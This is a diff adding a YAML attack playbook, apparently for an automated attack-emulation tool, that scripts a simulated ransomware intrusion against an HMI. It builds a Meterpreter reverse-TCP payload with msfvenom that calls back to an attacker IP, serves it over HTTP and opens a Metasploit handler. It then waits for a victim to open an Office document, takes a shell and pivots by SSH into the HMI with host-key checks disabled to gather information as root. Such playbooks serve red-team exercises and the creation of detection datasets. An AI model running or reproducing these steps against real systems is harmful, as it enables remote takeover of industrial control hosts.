@@ -1,0 +1,78 @@
+vars:
+  PAYLOAD: linux/x64/meterpreter/reverse_tcp
+  LPORT: 4443
+  ATTACKER: {{ attack_supplypro_ransom_attacker_ip }}
+  HMI_IP: {{ attack_supplypro_ransom_hmi_ip }}
+  VICTIM_USER: {{ attack_supplypro_ransom_victim_user }}
+  PAYLOAD_PROVIDER_IP: {{ attack_supplypro_ransom_payload_provider_ip }}
+  PAYLOAD_NAME: {{ attack_supplypro_ransom_payload_name }}
+  SERVICE_NAME: {{ attack_supplypro_ransom_service_name }}
+  ATTACHMENT: {{ attack_supplypro_ransom_attachment }}
+  HMI_VICTIM_USER: {{ attack_supplypro_ransom_hmi_victim_user }}
+  VICTIM_USER_EMAIL: {{ attack_supplypro_ransom_victim_user_email }}
+
+commands:
+  # tempfile for reverse shell payload
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+  
+  # generate reverse shell
+  - type: shell
+    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKER LPORT=$LPORT -f elf > ${RSHELL}
+  
+  # serve payload via http
+  - type: webserv
+    local_path: $RSHELL
+    port: 8080
+    background: True
+
+  # prepare reverse-shell-listener
+  - type: msf-module
+    creates_session: revshell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    background: true
+    kill_on_exit: true
+
+  - type: sleep
+    min_sec: 2
+    seconds: 5
+    random: True
+
+  - type: debug
+    cmd: Open Office-Document now!
+
+  # run commands via reverse shell
+  - type: msf-session
+    stdapi: true
+    session: revshell
+    cmd: sysinfo
+
+  - type: msf-session
+    session: revshell
+    cmd: shell
+
+  - type: setvar
+    cmd: revshell
+    variable: UPGRADESESSION
+
+  # upgrade shell to fully interactive shell
+  - type: include
+    local_path: playbooks/upgradeshell.yml
+
+  - type: msf-session
+    session: revshell
+    cmd: ssh -o StrictHostKeyChecking=no $VICTIM_USER@$HMI_IP
+
+  - type: setvar
+    cmd: revshell
+    variable: HMI_SESSION
+
+  # gather information as root
+  - type: include
+    local_path: playbooks/hmi.yml
+
